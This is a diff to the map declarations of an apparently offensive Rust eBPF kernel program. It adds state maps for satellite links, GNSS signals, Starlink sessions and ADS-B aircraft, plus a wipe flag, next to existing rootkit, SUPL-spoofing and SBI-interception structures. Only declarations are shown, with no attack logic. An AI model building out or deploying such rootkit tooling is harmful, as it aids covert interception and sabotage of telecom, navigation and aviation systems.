@@ -3,9 +3,10 @@ use aya_ebpf::{
     maps::{HashMap, RingBuf},
 };
 use common::{
-    AkaAuthState, CellInfo, EsimProvisionCtx, FemtocellCtx, GtpTunnelState, HandoverCtx,
-    ImsSipSession, LiInterfaceState, MimoBeamState, NetworkSliceInfo, NrfRegistration,
-    RoamingState, RootkitConfig, RtpStreamState, SbiSessionState, SidelinkCtx, SignalingState,
+    AdsbAircraftState, AkaAuthState, CellInfo, EsimProvisionCtx, FemtocellCtx, GnssSignalState,
+    GtpTunnelState, HandoverCtx, ImsSipSession, LiInterfaceState, MimoBeamState, NetworkSliceInfo,
+    NrfRegistration, NtnTimingState, RoamingState, RootkitConfig, RtpStreamState,
+    SatelliteLinkState, SbiSessionState, SidelinkCtx, SignalingState, StarlinkSessionState,
     SuplSpoofState, VoWiFiTunnelState,
 };
 
@@ -154,3 +155,31 @@ pub(crate) static NEIGHBOR_CELLS: HashMap<u32, [u8; 64]> = HashMap::with_max_ent
 
 #[map]
 pub(crate) static SBI_INTERCEPT_BUF: RingBuf = RingBuf::with_byte_size(64 * 1024, 0);
+
+// ──────────────────────────────────────────────
+// Category 8: Satellite Maps
+// ──────────────────────────────────────────────
+
+#[map]
+pub(crate) static SATELLITE_LINK_STATE: HashMap<u32, SatelliteLinkState> =
+    HashMap::with_max_entries(32, 0);
+
+#[map]
+pub(crate) static GNSS_SIGNAL_STATE: HashMap<u32, GnssSignalState> =
+    HashMap::with_max_entries(64, 0);
+
+#[map]
+pub(crate) static NTN_TIMING_STATE: HashMap<u32, NtnTimingState> =
+    HashMap::with_max_entries(16, 0);
+
+#[map]
+pub(crate) static STARLINK_SESSIONS: HashMap<u64, StarlinkSessionState> =
+    HashMap::with_max_entries(32, 0);
+
+#[map]
+pub(crate) static ADSB_AIRCRAFT: HashMap<u32, AdsbAircraftState> =
+    HashMap::with_max_entries(64, 0);
+
+#[map]
+pub(crate) static SAT_WIPE_FLAG: aya_ebpf::maps::Array<u32> =
+    aya_ebpf::maps::Array::with_max_entries(1, 0);
